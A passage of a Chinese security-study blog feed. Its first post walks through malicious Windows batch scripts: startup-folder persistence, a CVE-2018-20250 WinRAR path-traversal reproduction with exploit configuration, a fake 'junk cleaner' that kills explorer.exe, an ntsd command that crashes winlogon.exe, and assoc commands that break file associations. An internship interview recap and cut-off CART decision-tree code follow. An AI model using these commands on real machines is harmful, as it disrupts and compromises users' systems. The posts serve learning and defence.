Menu\Programs\Startup\clean.bat&quot;</span><br><span class="line">echo &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\clean.bat&quot; &gt;&gt; &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\clean.bat&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>血的教训，最好把路径用引号括起来，否则可能执行不成功。</p><p>“以管理员身份运行”，在Win 7中其实普通用户也可以。</p><img src="/posts/82a69c8b/2.1.2.png" class="" title="显示结果"><p>检查自启动目录是否创建了批处理脚本，双击它的确能不断打开CMD占用系统资源。</p><img src="/posts/82a69c8b/2.1.3.png" class="" title="自启动目录的clean.bat"><p>现在重启电脑测试是否能实现自启动。完美！</p><img src="/posts/82a69c8b/2.1.4.png" class="" title="显示结果"><h2 id="2-2-WinRAR恶意劫持自启动-CVE-2018-20250"><a href="#2-2-WinRAR恶意劫持自启动-CVE-2018-20250" class="headerlink" title="2.2 WinRAR恶意劫持自启动(CVE-2018-20250)"></a>2.2 WinRAR恶意劫持自启动(CVE-2018-20250)</h2><h3 id="2-2-1-漏洞描述"><a href="#2-2-1-漏洞描述" class="headerlink" title="2.2.1 漏洞描述"></a>2.2.1 漏洞描述</h3><p>WinRAR漏洞(CVE-2018-20250)是Check Point团队于2019年2月爆出的严重安全漏洞，该漏洞已存在于WinRAR中19年，是APT攻击中非常经典的漏洞。它是由于WinRAR使用一个陈旧的<code>UNACEV2.dll</code>动态链接库造成的。当我们解压任意ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意软件写入操作系统自启动文件夹，导致电脑重启时会自动运行该程序，从而造成恶意软件劫持。</p><h3 id="2-2-2-影响范围"><a href="#2-2-2-影响范围" class="headerlink" title="2.2.2 影响范围"></a>2.2.2 影响范围</h3><p>该漏洞会对多种压缩软件造成影响，版本如下：</p><ul><li>WinRAR &lt; v5.70 Beta 1</li><li>Bandizip &lt;= v6.2.0.0</li><li>好压(245压缩) &lt;= v5.9.8.10907</li><li>360压缩 &lt;= v4.0.0.1170</li></ul><h3 id="2-2-3-漏洞复现"><a href="#2-2-3-漏洞复现" class="headerlink" title="2.2.3 漏洞复现"></a>2.2.3 漏洞复现</h3><h4 id="2-2-3-1-环境配置"><a href="#2-2-3-1-环境配置" class="headerlink" title="2.2.3.1 环境配置"></a>2.2.3.1 环境配置</h4><p>攻击机：Windows 10 家庭版 x64</p><p>靶机：Windows 10 教育版 x64</p><p>利用工具：<a href="https://github.com/backlion/CVE-2018-20250">https://github.com/backlion/CVE-2018-20250</a></p><h4 id="2-2-3-2-复现准备"><a href="#2-2-3-2-复现准备" class="headerlink" title="2.2.3.2 复现准备"></a>2.2.3.2 复现准备</h4><p>在靶机上下载好<a href="https://pan.baidu.com/s/16eL9rA1gj9FdoBmLh3oieg">WinRAR v5.4</a>(提取码：lo3r)，安装之后可以看到本地WinRAR目录下的<code>UNACEV2.dll</code>动态链接库，这个就是被利用的入口。</p><img src="/posts/82a69c8b/2.1.5.png" class="" title="UNACEV2.dll"><p>下载CVE-2018-20250漏洞利用工具。解压出来如下：</p><ul><li><code>README.md</code>是漏洞利用说明书，告诉我们哪些参数可以修改、如何运行exp以及漏洞被利用的后果</li><li><code>hello.txt</code>和<code>world.txt</code>是需要压缩的文件</li><li><code>calc.exe</code>是计算器，可以替换成恶意软件，它会被定向植入系统自启动目录</li><li><code>exp.py</code>是运行的Python代码，它会将<code>hello.txt</code>和<code>world.txt</code>压缩，并隐藏恶意软件</li><li><code>acefile.py</code>是利用<code>UNACEV2.dll</code>漏洞的代码，共4000多行</li></ul><img src="/posts/82a69c8b/2.2.1.png" class="" title="漏洞利用工具"><h4 id="2-2-3-3-复现过程"><a href="#2-2-3-3-复现过程" class="headerlink" title="2.2.3.3 复现过程"></a>2.2.3.3 复现过程</h4><p>如果想要修改恶意文件、压缩文件名称、放在启动目录的文件名称等等，可以通过编辑<code>exp.py</code>实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment"># The archive filename you want</span></span><br><span class="line">rar_filename = <span class="string">&quot;test.rar&quot;</span></span><br><span class="line"><span class="comment"># The evil file you want to run</span></span><br><span class="line">evil_filename = <span class="string">&quot;calc.exe&quot;</span></span><br><span class="line"><span class="comment"># The decompression path you want, such shown below</span></span><br><span class="line">target_filename = <span class="string">r&quot;C:\C:C:../AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\hi.exe&quot;</span></span><br><span class="line"><span class="comment"># Other files to be displayed when the victim opens the winrar</span></span><br><span class="line"><span class="comment"># filename_list=[]</span></span><br><span class="line">filename_list = [<span class="string">&quot;hello.txt&quot;</span>, <span class="string">&quot;world.txt&quot;</span>]</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>运行<code>exp.py</code>，将生成的<code>test.rar</code>发送到靶机中。</p><img src="/posts/82a69c8b/2.2.2.png" class="" title="test.rar"><p>笑死，被发现了。为了实验，将它从隔离区拿出来。</p><img src="/posts/82a69c8b/2.2.3.png" class="" title="安全威胁提示"><p>查看压缩包发现里面不仅有<code>hello.txt</code>和<code>world.txt</code>，还有一个本地磁盘路径，点进去发现就是在自启动目录下放置的<code>hi.exe</code>。(这真的太明显了吧！！)</p><img src="/posts/82a69c8b/2.2.4.png" class="" title="查看压缩包"><p>注意：当用户解压文件时，其解压目录必须是<code>C:\Users\当前用户</code>目录下。</p><p>当用户解压完后，会在自启动目录生成一个<code>hi.exe</code>，也就是<code>calc.exe</code>。在系统重启后会自动打开<code>calc.exe</code>。</p><img src="/posts/82a69c8b/2.2.5.png" class="" title="自启动目录"><h2 id="2-3-恶意自启动防御"><a href="#2-3-恶意自启动防御" class="headerlink" title="2.3 恶意自启动防御"></a>2.3 恶意自启动防御</h2><p>自启动防御可以看<a href="https://v5le0n9.github.io/posts/a48809a5.html#3-2-检查启动项">熊猫烧香病毒的行为机理分析 3.2 检查启动项</a>，在WinRAR恶意劫持自启动漏洞中，可通过删除自启动目录下的恶意软件实现防御。</p><h1 id="3-进程关闭脚本"><a href="#3-进程关闭脚本" class="headerlink" title="3. 进程关闭脚本"></a>3. 进程关闭脚本</h1><p>继续编写一个伪装成“系统垃圾清理”的程序，它其实是一个进程关闭程序，试着关闭桌面进程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line">echo =====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】====</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =====垃圾清理中，请不要关闭窗口=========</span><br><span class="line">echo.</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">taskkill /im explorer.exe /f &gt;nul</span><br><span class="line">echo.</span><br><span class="line">echo =====拐了，你的系统已经废了=======</span><br><span class="line">echo.</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">echo.</span><br><span class="line">start c:\windows\explorer.exe</span><br><span class="line">echo.</span><br><span class="line">echo =====已经修复好！是不是吓坏了！！O(∩_∩)O==========</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>运行该批处理程序，桌面会消失，过一会儿桌面又会恢复。</p><h1 id="4-蓝屏攻击机理"><a href="#4-蓝屏攻击机理" class="headerlink" title="4. 蓝屏攻击机理"></a>4. 蓝屏攻击机理</h1><p>蓝屏死机称为BSOD(Blue Screen of Death)，也是常见的攻击行为，尤其是某些CVE漏洞复现过程，在进行提权尝试前都会先实现蓝屏攻击功能，危害极大。</p><h2 id="4-1-批处理脚本实现蓝屏攻击"><a href="#4-1-批处理脚本实现蓝屏攻击" class="headerlink" title="4.1 批处理脚本实现蓝屏攻击"></a>4.1 批处理脚本实现蓝屏攻击</h2><p>实现蓝屏的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.exe</span><br></pre></td></tr></table></figure><p>ntsd是一个用户态进程调试工具，从Windows 2000就开始被附随在System32目录下。它能够结束除<code>System</code>、<code>smss.exe</code>、<code>csrss.exe</code>、<code>lsass.exe</code>及各种<code>rootkit</code>程序外所有的程序。但在Windows Vista(06年发布)及以上版本的Windows中不含ntsd，必须手动下载至电脑中才可使用。</p><p>为了方便，直接使用Windows 2003实验。制作成批处理脚本或直接在CMD窗口输入命令，主机直接蓝屏并重启。(重启太快了没有蓝屏截图)</p><p>Windows Logon Process(即<code>winlogon.exe</code>)，是Windows NT 用户登录程序，用于管理用户登录和退出。该进程的正常路径应是<code>C:\Windows\System32</code>，且是以 SYSTEM 用户运行。</p><h2 id="4-2-ntsd命令常用参数"><a href="#4-2-ntsd命令常用参数" class="headerlink" title="4.2 ntsd命令常用参数"></a>4.2 ntsd命令常用参数</h2><img src="/posts/82a69c8b/4.2.1.png" class="" title="ntsd常用参数"><p>-c “<command>“表示c参数后面紧接命令，如上面的“q”应该是退出命令。</p><h2 id="4-3-结束进程的几种方法"><a href="#4-3-结束进程的几种方法" class="headerlink" title="4.3 结束进程的几种方法"></a>4.3 结束进程的几种方法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//利用进程的PID结束进程</span><br><span class="line">ntsd -c q -p PID</span><br><span class="line"></span><br><span class="line">//利用进程名结束进程</span><br><span class="line">ntsd -c q -pn xxxx.exe</span><br><span class="line"></span><br><span class="line">//利用taskkill命令强制终止进程</span><br><span class="line">taskkill /f /im PID</span><br><span class="line">taskkill /f /im xxxx.exe </span><br><span class="line"></span><br><span class="line">//利用tskill命令结束进程</span><br><span class="line">tskill PID</span><br><span class="line">//xxxx不能带有后缀名</span><br><span class="line">tskill xxxx</span><br></pre></td></tr></table></figure><h1 id="5-简单的扩展名修改恶意攻击"><a href="#5-简单的扩展名修改恶意攻击" class="headerlink" title="5. 简单的扩展名修改恶意攻击"></a>5. 简单的扩展名修改恶意攻击</h1><p>将文件格式修改或文档加密都是常见的病毒，比如永恒之蓝、勒索病毒等，它们就是将电脑内的所有资料、文档加密。当用户打开文件时需要密码，此时通过比特币付费进行勒索。</p><p>编写批处理脚本，当遇到可执行的EXE文件认为它是一个TXT文档，系统默认用记事本打开导致可执行文件运行不起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure><p>“以管理员身份运行”，EXE文件被当作TXT文件打开。</p><img src="/posts/82a69c8b/5.1.1.png" class=""><p>其它格式文件转换为TXT文件如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assoc .htm=txtfile</span><br><span class="line">assoc .dat=txtfile</span><br><span class="line">assoc .com=txtfile</span><br><span class="line">assoc .rar=txtfile</span><br><span class="line">assoc .gho=txtfile</span><br><span class="line">assoc .mvb=txtfile</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时，如果用户隐藏文件扩展名，甚至可以修改图标伪装成目标应用，当用户点击时会执行这些破坏。但由于不知道目标是否有隐藏扩展名，还是不建议这种“笨”方法。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;code&gt;.bat&lt;/code&gt;文件是DOS下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为&lt;code&gt;.bat&lt;/code&gt;或&lt;code&gt;.cmd&lt;/code&gt;。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用&lt;code&gt;cmd.exe&lt;/code&gt;按照该文件中各个命令出现的顺序依次运行它们。使用批处理文件或脚本，可以简化日常或重复性任务。攻击者通常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>工信部电子五所暑期实习二进制安全研究一面</title>
    <link href="http://example.com/posts/abe2eb06.html"/>
    <id>http://example.com/posts/abe2eb06.html</id>
    <published>2022-06-25T12:23:44.518Z</published>
    <updated>2022-06-25T13:22:18.202Z</updated>
    
    <content type="html"><![CDATA[<p>有了第一次面试的经验，起码有些问题回答得上来了，但面试官说我目前学的还比较基础，我会继续努力的！</p><p>6.13投的简历，6.17面试，现在6.25了为什么还没有消息救命！！</p><span id="more"></span><p>1.首先做一个简单的自我介绍，把你的兴趣、基础等做一个说明和介绍。</p><p>2.为什么会选Windows逆向，因为很多做逆向入门的人都是从Linux逆向开始学习的，你为什么会选Windows逆向来入门？</p><p>3.你觉得你的哪个实践经历或病毒样本最能体现你的研究成果，让你最有成就感的？</p><p>4.你对熊猫样本病毒研究到哪一步？如果你给我们介绍的话你能介绍什么东西？</p><p>5.你对Windows操作系统了解多少？比如说病毒要得到一个远控的话，要启动一个shell，Windows的shellcode和Linux的shellcode是不一样的，这与操作系统相关，Linux操作系统与Windows操作系统的系统调用、堆栈方式、API都不太一样，这方面你了解多少？</p><p>6.假如让你写一个病毒，你觉得你现在还缺什么？</p><p>7.那你分析熊猫样本病毒，你觉得哪一部分是最难的？</p><p>8.你为什么选择二进制方向？</p><p>9.你们这边能实习多长时间？</p><p>10.你工作有什么要求吗，比如说我们公司安排你实习你会考虑留下来吗？</p><p>11.你对Windows二进制安全方面的研究你有什么计划和想法？</p><p><strong>反问环节</strong></p><p>1.您对我这次面试的印象怎样？会不会达不到你们的要求？</p><p>答：我们这边做Windows逆向的比较少，所以我们想多招一些这个方向的人过来。你这边目前还是比较基础的，可能后面还需要更多的学习和积累。</p><p>2.如果我面试通过了会有岗前培训吗？</p><p>答：有培训，但培训更多的是做Linux平台的漏洞挖掘和漏洞利用，其次还有嵌入式、物联网的操作系统，Windows上的比较少。我们应该7月份有一个新入职的，他做Windows逆向应该要比你深入一点，他可以跟你一起。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有了第一次面试的经验，起码有些问题回答得上来了，但面试官说我目前学的还比较基础，我会继续努力的！&lt;/p&gt;
&lt;p&gt;6.13投的简历，6.17面试，现在6.25了为什么还没有消息救命！！&lt;/p&gt;</summary>
    
    
    
    <category term="往社畜方向前进" scheme="http://example.com/categories/%E5%BE%80%E7%A4%BE%E7%95%9C%E6%96%B9%E5%90%91%E5%89%8D%E8%BF%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>决策树之CART算法</title>
    <link href="http://example.com/posts/8464a317.html"/>
    <id>http://example.com/posts/8464a317.html</id>
    <published>2022-06-05T13:51:36.733Z</published>
    <updated>2022-06-05T14:55:01.147Z</updated>
    
    <content type="html"><![CDATA[<p>CART算法是二叉决策树。本来这个算法难得我想放弃，copy某位博主的代码修改修改就交上去的。结果越改越多，最后除了核心算法没改，整个框架结构都被我改了。被我修改得看起来貌似有点累赘，但好像也是必要的。</p><span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CreateData</span>():</span><br><span class="line">    x = np.array([[<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;125&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;100&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;70&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;120&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;离异&#x27;</span>,<span class="string">&#x27;95&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;60&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;有房&#x27;</span>,<span class="string">&#x27;离异&#x27;</span>,<span class="string">&#x27;220&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;85&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;已婚&#x27;</span>,<span class="string">&#x27;75&#x27;</span>],</span><br><span class="line">                 [<span class="string">&#x27;无房&#x27;</span>,<span class="string">&#x27;单身&#x27;</span>,<span class="string">&#x27;90&#x27;</span>]])</span><br><span class="line">    signal = np.array([<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>]) <span class="comment">#用0表示特征是离散的，1表示是连续的</span></span><br><span class="line">    y = np.array([<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>,<span class="string">&#x27;否&#x27;</span>,<span class="string">&#x27;是&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> x, y, signal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DataProcessing</span>(<span class="params">x, signal</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(signal)):</span><br><span class="line">        <span class="keyword">if</span> signal[i] == <span class="number">1</span>:</span><br><span class="line">            tmp = x[:,i]       </span><br><span class="line">            int_list = [<span class="built_in">int</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> tmp]</span><br><span class="line">            sort_lst = <span class="built_in">sorted</span>(int_list)</span><br><span class="line">            split_point = [j <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(sort_lst[<span class="number">0</span>],sort_lst[-<span class="number">1</span>],<span class="built_in">int</span>((sort_lst[-<span class="number">1</span>]-sort_lst[<span class="number">0</span>])/<span class="built_in">len</span>(sort_lst)))]</span><br><span class="line">            smin = <span class="number">20000</span> <span class="comment">#初始化方差</span></span><br><span class="line">            jmin = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> split_point:</span><br><span class="line">                x1, x2 = [], []</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_list)):</span><br><span class="line">                    <span class="keyword">if</span> k &gt;= int_list[j]:</span><br><span class="line">                        x1.append(int_list[j])</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        x2.append(int_list[j])</span><br><span class="line">                <span class="comment">#print(x1,x2)</span></span><br><span class="line">                r1, r2 = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">                avg1 = <span class="built_in">sum</span>(x1) / <span class="built_in">len</span>(x1)</span><br><span class="line">                avg2 = <span class="built_in">sum</span>(x2) / <span class="built_in">len</span>(x2)</span><br><span class="line">                <span class="comment">#print(avg1, avg2)</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> x1:</span><br><span class="line">                    r1 += (j - avg1) ** <span class="number">2</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> x2:</span><br><span class="line">                    r2 += (j - avg2) ** <span class="number">2</span></span><br><span class="line">                <span class="comment">#print(r1+r2)</span></span><br><span class="line">                <span class="keyword">if</span> r1 + r2 &lt; smin:</span><br><span class="line">                    jmin = k</span><br><span class="line">                    smin = r1 + r2</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(int_list)):</span><br><span class="line">                <span class="keyword">if</span> int_list[j] &gt; jmin:</span><br><span class="line">                    x[j][i] = <span class="string">&#x27;高&#x27;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    x[j][i] = <span class="string">&#x27;低&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#基尼指数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Gini</span>(<span class="params">y</span>):</span><br><span class="line">    <span class="comment">#Counter()用来统计不同类别的数量</span></span><br><span class="line">    counter = Counter(y)</span><br><span class="line">    g = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> counter.values():</span><br><span class="line">        p = num / <span class="built_in">len</span>(y)</span><br><span class="line">        g -= p * p</span><br><span class="line">    <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="comment">#CART算法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DecisionTree</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.tree = &#123;&#125;</span><br><span class="line">        self.lst = []<span class="comment"># 若有2个以上特征值的特征需记下哪个特征值作为切分点时得出的基尼指数最小</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#训练决策树</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fit</span>(<span class="params">self,x,y</span>):</span><br><span class="line">        cols = <span class="built_in">list</span>(<span class="built_in">range</span>(x.shape[<span class="number">1</span>]))<span class="comment"># [0,1,2]</span></span><br><span class="line">        <span class="comment">#对x的每一列数据，计算基尼指数</span></span><br><span class="line">        self.tree = self._genTree(cols, x, y)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#递归生成决策树</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_genTree</span>(<span class="params">self, cols, x, y</span>):</span><br><span class="line">        <span class="comment"># 计算基尼指数，求得基尼指数最小的特征</span></span><br><span class="line">        imin = cols[<span class="number">0</span>] <span class="comment"># 初始化最小基尼指数的特征</span></span><br><span class="line">        emin = <span class="number">1</span> <span class="comment"># 初始化最小基尼指数为1</span></span><br><span class="line">        e = <span class="number">0.01</span> <span class="comment"># 阈值</span></span><br><span class="line">        st = <span class="string">&#x27;&#x27;</span> <span class="comment"># 若有2个以上特征值的特征需记下哪个特征值作为切分点时得出的基尼指数最小</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> cols:</span><br><span class="line">            coli = x[:,i]<span class="comment">#拿到第i个特征数据</span></span><br><span class="line">            <span class="comment">#在特征为i的情况下，样本集的基尼指数</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(<span class="built_in">set</span>(coli)) &lt;= <span class="number">2</span>:</span><br><span class="line">                gini = <span class="built_in">sum</span>([<span class="built_in">len</span>(y[coli==d]) / <span class="built_in">len</span>(coli) * Gini(y[coli==d]) <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">set</span>(coli)])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                emin_tmp = <span class="number">1</span></span><br><span class="line">                setlst = <span class="built_in">list</span>(<span class="built_in">set</span>(coli))</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(setlst)):</span><br><span class="line">                    gini = <span class="built_in">len</span>(y[coli==setlst[d]]) / <span class="built_in">len</span>(coli) * Gini(y[coli==setlst[d]])</span><br><span class="line">                    gini += <span class="built_in">len</span>(y[coli!=setlst[d]]) / <span class="built_in">len</span>(coli) * Gini(y[coli!=setlst[d]])      </span><br><span class="line">                    <span class="keyword">if</span> gini &lt;= emin_tmp:</span><br><span class="line">                        st = setlst[d]</span><br><span class="line">                        emin_tmp = gini      </span><br><span class="line">                gini = emin_tmp</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> gini &lt;= emin:</span><br><span class="line">                imin = i</span><br><span class="line">                emin = gini</span><br><span class="line">        self.lst.append(st)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#根据最优特征和最优切分点，生成两个子节点   </span></span><br><span class="line">        newtree=&#123;&#125;</span><br><span class="line">        mincol = x[:,imin]</span><br><span class="line">        cols.remove(imin)</span><br><span class="line">        <span class="comment">#针对这个特征的每个特征值，进一步划分树</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> &lt; <span class="built_in">len</span>(<span class="built_in">set</span>(mincol)) &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span 